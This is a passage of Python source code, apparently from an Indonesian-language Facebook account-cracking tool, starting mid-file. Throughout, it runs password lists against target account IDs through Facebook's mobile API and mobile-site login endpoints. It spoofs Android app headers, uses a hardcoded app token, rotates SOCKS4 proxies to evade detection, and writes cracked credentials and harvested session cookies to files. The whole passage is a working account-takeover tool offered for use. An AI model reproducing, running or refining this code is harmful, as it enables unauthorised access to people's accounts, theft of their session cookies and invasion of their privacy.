	#ugent = "Dalvik/2.1.0 (Linux; U; Android "+versi+"; "+model+" Build/"+device+") [FBAN/Orca-Android;FBAV/"+appver+";FBPN/com.facebook.katana;FBLC/es_CU;FBBV/14274161;FBCR/null;FBSV/samsung;FBBD/samsung;FBDV/"+model+";FBSV/.0.5;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,height=600,width=1024};FB_FW/1;]"
	
	return ugent,device,appver,versi

def metode_api(user,pwx):
	global ok,cp,loop
	ugent,device,appver,versi = useragent()
	prog.update(des,description=f"crack {str(loop)}/{len(id)} OK : {H}{len(ok)}{N} CP : {K}{len(cp)}{N}")
	prog.advance(des)
	try:
		for pw in pwx:
			pw = pw.lower()
			headers = {
				"Host": "b-api.facebook.com",
				"user-agent": ugent,
				"Accept-Encoding": "gzip, deflate",
				"connection": "keep-alive",
				"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
				"x-fb-sim-hni": str(random.randint(20000, 40000)),
				"x-fb-net-hni": str(random.randint(20000, 40000)),
				"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
				"X-FB-Connection-Quality": "EXCELLENT",
				"X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
				"X-Fb-Net-Sid": "",
				"x-fb-http-engine": "Liger",
				#"x-fb-friendly-name": "",
				"Content-Type": "application/x-www-form-urlencoded"
				}
			data = {
				"adid": str(uuid.uuid4()),
				"email": user,
				"password": pw,
				"cpl": "true",
				"credentials_type": "password",
				"error_detail_type": "button_with_disabled",
				"source": "login",
				"format": "json",
				"device_id": str(uuid.uuid4()),
				"family_device_id": str(uuid.uuid4()),
				"generate_session_cookies": "1",
				"generate_analytics_claim": "1",
				"generate_machine_id": "1",
				"tier": "regular",
				"device": device,
				"os_ver": versi,
				"carrier": "AT%26T",
				"app_id": "350685531728",
				"app_ver": appver,
				"locale": "en_CU",
				"client_country_code": "CU",
				"advertising_id": str(uuid.uuid4()),
				"fb_api_req_friendly_name": "authenticate",
				"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
				#"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
				}
			post = ses.post("https://b-api.facebook.com/auth.login",data=data,headers=headers)
			if "session_key" in post.text and "EAA" in post.text:
				ok.append(user)
				coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
				tree = Tree("                                 ")
				tree.add(f"\r{H}{user}|{pw}{P} ")
				tree.add(f"{H}{coki}{N}")
				prints(tree)
				open(f"OK/{hari_ini}.txt","a").write("  * --> %s|%s|%s\n"%(user, pw,coki))
				break
			elif "User must verify their account" in post.text:
				cp.append(user)
				tree = Tree("                                 ")
				tree.add(f"\r{K}{user}|{pw}{P} ")
				prints(tree)
				open(f"CP/{hari_ini}.txt","a").write("  * --> %s|%s\n"%(user, pw))
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		sleep(32)

###----------[ METODE CRACK ]---------- ###
def metode_reguler(user, pwx, url):
	global ok,cp,loop
	prox = open("data/proxy.txt","r").read().splitlines()
	prog.update(des,description=f"crack {str(loop)}/{len(id)} OK : {H}{len(ok)}{N} CP : {K}{len(cp)}{N}")
	prog.advance(des)
	try:
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ua = random.choice(uasm)
			proxy= {"http": f"socks4://{random.choice(prox)}"}
			headers1= {
				"Host":url,
				"upgrade-insecure-requests":"1",
				"user-agent":ua,
				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1",
				"x-requested-with":"com.facebook.katana",
				"sec-fetch-site":"same-origin",
				"sec-fetch-mode":"cors",
				"sec-fetch-user":"empty",
				"sec-fetch-dest":"document",
				"referer":f"https://{url}/",
				"accept-encoding":"gzip, deflate br",
				"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}
			p = ses.get(f"https://{url}/login/?next&ref=dbl&fl&refid=8",headers=headers1)
			data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"email":user,
				"pass":pw,
				"next": f"https://{url}/login/save-device/"
				}
			headers2 = {
				"Host": url,
				"cache-control":"max-age=0",
				"upgrade-insecure-requests":"1",
				"origin":f"https://{url}",
				"content-type":"application/x-www-form-urlencoded",
				"user-agent":ua,
				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"x-requested-with":"com.facebook.katana",
				"sec-fetch-site":"same-origin",
				"sec-fetch-mode":"cors",
				"sec-fetch-user":"empty",
				"sec-fetch-dest":"document",
				'referer':f'https://{url}/login/?next&ref=dbl&fl&refid=8',
				"accept-encoding":"gzip, deflate br",
				"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}
			po = ses.post(f"https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl",data=data, headers=headers2, proxies=proxy)
			if "c_user" in ses.cookies.get_dict():
				ok.append(user)
				coki = convert(ses.cookies.get_dict())
				user = re.findall("c_user=(\d+)",coki)[0]
				tree = Tree("                                 ")
				tree.add(f"\r{H}{user}|{pw}{P} ")
				tree.add(f"{H}{coki}{N}")
				prints(tree)
				open(f"OK/{hari_ini}.txt","a").write("  * --> %s|%s|%s\n"%(user, pw,coki))
				break
			elif "checkpoint" in ses.cookies.get_dict():
				user = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp.append(user)
				tree = Tree("                                 ")
				tree.add(f"\r{K}{user}|{pw}{P} ")
				prints(tree)
				open(f"CP/{hari_ini}.txt","a").write("  * --> %s|%s\n"%(user, pw))
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		sleep(32)

	
def metode_validate(user, pwx, url):
	global ok,cp,loop
	prox = open("data/proxy.txt","r").read().splitlines()
	prog.update(des,description=f"crack {str(loop)}/{len(id)} OK : {H}{len(ok)}{N} CP : {K}{len(cp)}{N}")
	prog.advance(des)
	for pw in pwx:
		try:
			pw = pw.lower()
			ses=requests.Session()
			ua = random.choice(uasm)
			proxy= {"http": f"socks4://{random.choice(prox)}"}
			header = {
				"Host":url,
				"upgrade-insecure-requests":"1",
				"user-agent": ua,
				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"dnt":"1",
				"x-requested-with":"XMLHttpRequest",
				"sec-fetch-site":"same-origin",
				"sec-fetch-mode":"cors",
				"sec-fetch-user":"empty",
				"sec-fetch-dest":"document",
				"referer":"https://m.facebook.com/",
				"accept-encoding":"gzip, deflate br",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			p = ses.get(f"https://{url}/login/device-based/password/?uid={user}&flow=login_no_pin", headers=header)
			data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"uid":user,
				"flow":"login_no_pin",
				"pass":pw,
				"next": f"https://{url}/login/save-device/"}
			header1 = {
				"Host":url,
				"cache-control":"max-age=0",
				"upgrade-insecure-requests":"1",
				"origin": f"https://{url}",
				"content-type":"application/x-www-form-urlencoded",
				"user-agent": ua,
				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"x-requested-with":"XMLHttpRequest",
				"sec-fetch-site":"same-origin",
				"sec-fetch-mode":"cors",
				"sec-fetch-user":"empty",
				"sec-fetch-dest":"document",
				"referer": f"https://{url}/login/device-based/password/?uid={user}&flow=login_no_pin",
				"accept-encoding":"gzip, deflate br",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0", data = data, headers = header1, allow_redirects = False, proxies=proxy)
			if "c_user" in ses.cookies.get_dict():
				ok.append(user)
				coki = convert(ses.cookies.get_dict())
				user = re.findall("c_user=(\d+)",coki)[0]
				tree = Tree("                                 ")
				tree.add(f"\r{H}{user}|{pw}{P} ")
				tree.add(f"{H}{coki}{N}")
				prints(tree)
				open(f"OK/{hari_ini}.txt","a").write("  * --> %s|%s|%s\n"%(user, pw,coki))
				break
			elif "checkpoint" in ses.cookies.get_dict():
				user = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp.append(user)
				tree = Tree("                                 ")
				tree.add(f"\r{K}{user}|{pw}{P} ")
				prints(tree)
				open(f"CP/{hari_ini}.txt","a").write("  * --> %s|%s\n"%(user, pw))
				break
		except requests.exceptions.ConnectionError:
			sleep(32)

	loop+=1

###----------[ CONVERT COOKIE ]---------- ###
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))
	
###----------[ TEMPAT SIMPAN HASIL ]---------- ###
def simpan_hasil():
	prints(Panel(f"""\r{P2}hasil crack ok tersimpan ke : {hari_ini}
hasil crack ok tersimpan ke : {hari_ini}""",width=80,padding=(0,12),style=f"{color_table}"))

###----------[ BUAT FOLDER SIMPAN HASIL ]---------- ###
def make():
	try:os.mkdir("OK")
	except:pass
	try:os.mkdir("CP")
	except:pass
	menu()

if __name__=="__main__":
	make()
